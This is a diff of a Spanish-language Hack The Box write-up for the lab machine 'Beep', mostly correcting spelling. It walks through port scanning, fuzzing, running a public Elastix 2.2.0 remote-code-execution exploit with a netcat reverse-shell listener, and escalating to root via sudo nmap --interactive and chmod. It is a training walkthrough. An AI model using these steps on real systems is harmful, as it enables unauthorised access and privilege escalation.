@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Beep - Hack The Box
-excerpt: "Esta máquina es facil, hay bastantes maneras de poder vulnerarla, lo que haremos sera usar un exploit que nos conecte de manera remota a la máquina, sera configurado y modificado para que sea aceptado pues la pagina web que esta activa en el puerto 80 tiene ya expirado su certificado SSL. Una vez dentro usaremos los permisos que tenemos para convertirnos en Root usando la herramienta nmap tal y como lo menciona el exploit."
+excerpt: "Esta máquina es fácil, hay bastantes maneras de poder vulnerarla, lo que haremos será usar un Exploit que nos conecte de manera remota a la máquina, será configurado y modificado para que sea aceptado pues la página web que esta activa en el puerto 80 tiene ya expirado su certificado SSL. Una vez dentro usaremos los permisos que tenemos para convertirnos en Root usando la herramienta nmap tal y como lo menciona el Exploit."
 date: 2023-02-15
 classes: wide
 header:
@@ -20,11 +20,11 @@ tags:
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-beep/beep_logo.png)
-Esta máquina es facil, hay bastantes maneras de poder vulnerarla, lo que haremos sera usar un exploit que nos conecte de manera remota a la máquina, sera configurado y modificado para que sea aceptado pues la pagina web que esta activa en el puerto 80 tiene ya expirado su certificado SSL. Una vez dentro usaremos los permisos que tenemos para convertirnos en Root usando la herramienta nmap tal y como lo menciona el exploit.
+Esta máquina es fácil, hay bastantes maneras de poder vulnerarla, lo que haremos será usar un Exploit que nos conecte de manera remota a la máquina, sera configurado y modificado para que sea aceptado pues la página web que esta activa en el puerto 80 tiene ya expirado su certificado SSL. Una vez dentro usaremos los permisos que tenemos para convertirnos en Root usando la herramienta nmap tal y como lo menciona el Exploit.
 
 # Recopilación de Información
 ## Traza ICMP
-Vamos a realizar un ping para saber si la máquina esta conectada y vamos a analizar el TTL para saber que SO tiene dicha máquina.
+Vamos a realizar un ping para saber si la máquina está conectada y vamos a analizar el TTL para saber que SO tiene dicha máquina.
 ```
 ping -c 4 10.10.10.7 
 PING 10.10.10.7 (10.10.10.7) 56(84) bytes of data.
@@ -91,7 +91,7 @@ Nmap done: 1 IP address (1 host up) scanned in 38.05 seconds
 * -Pn: Para indicar que se omita el descubrimiento de hosts.
 * -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-Ufff muchos puertos abiertos, tenemos bastantillo que investigar, aunque ya vi unos servicios conocidos como el ssh, el rcbind y el puerto http, veamos que show con los demás servicios.
+Ufff muchos puertos abiertos, tenemos bastantillo que investigar, aunque ya vi unos servicios conocidos como el **SSH**, el **RPCBIND** y el puerto HTTP, veamos que show con los demás servicios.
 
 ## Escaneo de Servicios
 ```
@@ -151,21 +151,22 @@ Nmap done: 1 IP address (1 host up) scanned in 245.95 seconds
 * -p: Para indicar puertos específicos.
 * -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Ok, para empezar no tenemos ninguna credencial para el servicio SSH por lo que es el primero que descartamos, podriamos iniciar viendo que es ese servicio de **Postfix smtpd** y despues la pagina web del puerto http. De ahi en adelante tambien podriamos investigar el servicio **Cyrus pop3d**. Bueno empecemos a investigar pues.
+Ok, para empezar, no tenemos ninguna credencial para el servicio SSH por lo que es el primero que descartamos, podríamos iniciar viendo que es ese servicio de **Postfix smtpd** y después la página web del puerto HTTP. De ahí en adelante también podríamos investigar el servicio **Cyrus pop3d**. Bueno empecemos a investigar pues.
 
+# Análisis de Vulnerabilidades
 ## Investigación de Servicios
 Vamos a iniciar con el **Postfix smtpd**:
 
 **Postfix es un agente de transporte de mensajes (MTA) de última generación, también conocido como servidor SMTP, que tiene dos propósitos: Es responsable de transportar mensajes de correo electrónico desde un cliente de correo o  agente de usuario de correo (MUA) a un servidor SMTP remoto.**
 
-No tenemos una versión y de hecho busque con **Searchsploit** para saber si habia algo pero no, no mostro ningun resultado:
+No tenemos una versión y de hecho busque con **Searchsploit** para saber si había algo, pero no, no mostro ningún resultado:
 ```
 searchsploit Postfix smtpd                                                                                                              
 Exploits: No Results
 Shellcodes: No Results
 Papers: No Results
 ```
-Entonces vamos a descartar este servicio de momento y pasemos a analizar la pagina web.
+Entonces vamos a descartar este servicio de momento y pasemos a analizar la página web.
 
 **IMPORTANTE**, tuve problemas para entrar pues salia el error **SSL_ERROR_UNSUPPORTED_VERSION**, el sig. link explica como resolverlo, echale un ojo: 
 
@@ -183,12 +184,11 @@ Mmmmm entonces podemos entrar directamente a la máquina para poder encontrar la
 
 ![](/assets/images/htb-writeup-beep/Captura2.png)
 
-Usan PHP, entonces podemos hacer un fuzzing para ver que otras subpaginas hay, pero antes de hacerlo, probemos si sirven las credenciales por defecto que tiene el servicio **Elastix**, las credenciales son:
+Usan PHP, entonces podemos hacer un **Fuzzing** para ver que otras subpáginas hay, pero antes de hacerlo, probemos si sirven las credenciales por defecto que tiene el servicio **Elastix**, las credenciales son:
 * eLaStIx.
 * 2oo7
 
-No sirvieron, bueno hagamos el fuzzeo:
-
+No sirvieron, bueno hagamos el **Fuzzing**:
 ```
 wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.7/FUZZ.php/
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -217,16 +217,16 @@ ID           Response   Lines    Word       Chars       Payload
 ...
 ```
 * -c: Para que se muestren los resultados con colores.
-* --hc: Para que no muestre el codigo de estado 404, hc = hide code.
-* -t: Para usar una cantidad especifica de hilos.
+* --hc: Para que no muestre el código de estado 404, hc = hide code.
+* -t: Para usar una cantidad específica de hilos.
 * -w: Para usar un diccionario de wordlist.
 * Diccionario que usamos: dirbuster
 
-Wow, wow, wow, salieron demasiados codigos de estado 302, este codigo quiere decir que el recurso solicitado ha sido movido temporalmente a la URL dada por las cabeceras Location (en-US), osea que no podremos accesar a ellos.
+Wow, wow, wow, salieron demasiados códigos de estado 302, este código quiere decir que el recurso solicitado ha sido movido temporalmente a la URL dada por las cabeceras **Location (en-US)**, ósea que no podremos accesar a ellos.
 
-Entonces no creo que podamos hacer mucho, busquemos directamente un exploit para este servicio.
+Entonces no creo que podamos hacer mucho, busquemos directamente un Exploit para este servicio.
 
-# Analisis de Vulnerabilidades
+# Explotación de Vulnerabilidades
 ## Buscando y Probando un Exploit
 ```
 searchsploit elastix      
@@ -244,7 +244,7 @@ FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                          
 Shellcodes: No Results
 Papers: No Results
 ```
-Hay varios que me gustaria probar como el LFI, XSS y PHP Code Injection, pero creo que seria mejor si probamos con el RCE. Vamos a analizar y despues los demás.
+Hay varios que me gustaría probar como el LFI, XSS y PHP Code Injection, pero creo que sería mejor si probamos con el RCE. Vamos a analizar y después los demás.
 
 ### Probando el Exploit: Elastix 2.2.0 - Remote Code Execution
 ```
@@ -256,34 +256,33 @@ searchsploit -x php/webapps/18650.py
  Verified: True
 File Type: Python script, ASCII text executable, with very long lines (418)
 ```
-Parece que este exploit nos mete directamente usando la url para inyectar un payload que sera una Reverse Shell, esto ya es automatizado, solamente tendriamos que poner la IP de la maquina, nuestra IP y el puerto al que nos conectara, osease una netcat. Vamos a probarlo:
+Parece que este Exploit nos mete directamente usando la URL para inyectar un Payload que será una Reverse Shell, esto ya es automatizado, solamente tendríamos que poner la IP de la máquina, nuestra IP y el puerto al que nos conectara, osease una netcat. Vamos a probarlo:
 ```
 rhost="10.10.10.7"
 lhost="Tu_IP"
 lport=443
 ```
-Cambia esos datos y corre el script con python2 y...nada, no me conecto a nada y no salio nada en la pagina. Supongo que es por el problema que tuve antes para poder entrar a la pagina, pues el certificado SSL parece ya no servir, quiza si lo modificamos puede que apruebe el exploit y sirva, vamos a investigar un poco como podemos modificarlo.
+Cambia esos datos y corre el script con Python 2 y...nada, no me conecto a nada y no salió nada en la página. Supongo que es por el problema que tuve antes para poder entrar a la página, pues el certificado SSL parece ya no servir, quizá si lo modificamos puede que apruebe el Exploit y sirva, vamos a investigar un poco como podemos modificarlo.
 
-Durante la busqueda, encontre un github que justamente cambia el exploit para que este opere bien:
+Durante la búsqueda, encontré un GitHub que justamente cambia el Exploit para que este opere bien:
 * https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution
 
-Para modificar el exploit se debe buscar una extension que sirva con el servicio FreePBX que esta relacionado con el servicio Elastix de esta máquina, pero que es FreePBX?
+Para modificar el Exploit se debe buscar una extensión que sirva con el servicio **FreePBX** que está relacionado con el servicio **Elastix** de esta máquina, pero ¿qué es FreePBX?
 
 **FreePBX es una GUI de código abierto basado en Web que controla y dirige Asterisk. También se incluye como una pieza clave de otras distribuciones como Elastix, Trixbox y AsteriskNOW.**
 
-Entonces como el certificado SSL ya no sirve, por consiguiente la extension del exploit tampoco (que es la extension 1000), entonces usaremos otra extension disponible para poder conectarnos al servidor y que con esto sirva el exploit.
+Entonces como el certificado SSL ya no sirve, por consiguiente, la extensión del Exploit tampoco (que es la extensión 1000), entonces usaremos otra extensión disponible para poder conectarnos al servidor y que con esto sirva el Exploit.
 
-Para buscar una extension es necesario el paquete de herramientas **sipvicious**, de aqui usaremos la herramienta **svwar**, esta herramienta identifica las líneas de extensión en funcionamiento en un PBX. También le dice si la línea de extensión requiere autenticación o no.
+Para buscar una extensión es necesario el paquete de herramientas **sipvicious**, de aqui usaremos la herramienta **svwar**, esta herramienta identifica las líneas de extensión en funcionamiento en un PBX. También le dice si la línea de extensión requiere autenticación o no.
 
-Claro que en este caso ya no es necesario, pues ya hay una extension que sirve dentro del exploit modificado en el github, lo unico que tenemos que hacer es copiar los cambios, osea, la extension, las 3 lineas de codigo abajo de la extension y agregar el context al urlopen.
+Claro que en este caso ya no es necesario, pues ya hay una extensión que sirve dentro del Exploit modificado en el GitHub, lo único que tenemos que hacer es copiar los cambios, ósea, la extension, las 3 líneas de código abajo de la extensión y agregar el **context** al **urlopen**.
 
-# Explotando Vulnerabilidades
-Ahora si, levantamos la netcat otra vez:
+Ahora sí, levantamos la netcat otra vez:
 ```
 nc -nvlp 443
 listening on [any] 443 ...
 ```
-* Corremos el exploit:
+* Corremos el Exploit:
 ```
 python2 Exploit_Elastix1.py
 ```
@@ -299,7 +298,7 @@ uid=100(asterisk) gid=101(asterisk)
 ```
 
 # Post Explotación
-Bueno y ahora que? El mismo exploit nos indica que hacer y es activar el nmap con sudo de forma interactiva, para poder usar nmap desde la consola y no como comando, solamente escribimos !sh y podremos escalar privilegios para ser root:
+Bueno, ¿y ahora qué? El mismo Exploit nos indica que hacer y es activar el nmap con SUDO de forma interactiva, para poder usar nmap desde la consola y no como comando, solamente escribimos **!sh** y podremos escalar privilegios para ser Root:
 ```
 sudo nmap --interactive
 Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
@@ -308,13 +307,13 @@ nmap> !sh
 whoami
 root
 ```
-Ya solo es buscar las flags que la del root se encuentra en **/root** y la del usuario en **/home**. PEROOOO, que tal si vemos de que otra forma podemos explotar la maquina? Es hora de experimentar.
+Ya solo es buscar las flags que la del Root se encuentra en **/root** y la del usuario en **/home**. PEROOOO, que tal si vemos de que otra forma podemos explotar la máquina? Es hora de experimentar.
 
-Lo que hicmos fue abusar de los privilegios que tiene el usuarios **Asterisk** que como ya vimos esta ligado al servicio Elastix y FreePBX, pero que es este usuario?
+Lo que hicimos fue abusar de los privilegios que tiene el usuario **Asterisk** que como ya vimos está ligado al servicio **Elastix** y **FreePBX**, pero que es este usuario?
 
 **Asterisk es un programa de software libre que proporciona funcionalidades de una central telefónica.** Osea que por defecto, tiene ciertos privilegios para poder operar.
 
-Con el comando **sudo -l** podemos ver que permisos como root tiene dicho usuario **Asterisk**:
+Con el comando **sudo -l** podemos ver que permisos como Root tiene dicho usuario **Asterisk**:
 ```
 sudo -l
 Matching Defaults entries for asterisk on this host:
@@ -339,12 +338,12 @@ User asterisk may run the following commands on this host:
     (root) NOPASSWD: /sbin/chkconfig
     (root) NOPASSWD: /usr/sbin/elastix-helper
 ```
-Vaya, vaya, tenemos varios permisos como root. Existe una pagina muy util que nos ayudara en este caso para ver de que otra forma podemos escalar privilegios para convertirnos en **Root**. 
-Esta pagina es GTFOBins: 
+Vaya, vaya, tenemos varios permisos como Root. Existe una página muy útil que nos ayudara en este caso para ver de qué otra forma podemos escalar privilegios para convertirnos en **Root**. 
+Esta página es GTFOBins: 
 
 * https://gtfobins.github.io/
 
-Entonces veamos de que formas podemos escalar para ser **Root**, ojito que incluso ahi se ve el nmap que fue el que uso el exploit para convertirnos en Root, asi que PROBEMOS OTROS!!
+Entonces veamos de que formas podemos escalar para ser **Root**, ojito que incluso ahí se ve el nmap que fue el que uso el Exploit para convertirnos en Root, así que ¡¡PROBEMOS OTROS!!
 
 * Probando CHMOD:
 ```
@@ -359,7 +358,7 @@ uid=100(asterisk) gid=101(asterisk) euid=0(root)
 whoami
 root
 ```
-Por lo que lei en GTFOBins, se puede escalar usando chown, yum y service. Intentalo!
+Por lo que leí en **GTFOBins**, se puede escalar usando chown, yum y service. ¡Intentalo!
 
 ## Links de Investigación
 * https://stackoverflow.com/questions/63111167/ssl-error-unsupported-version-when-attempting-to-debug-with-iis-express
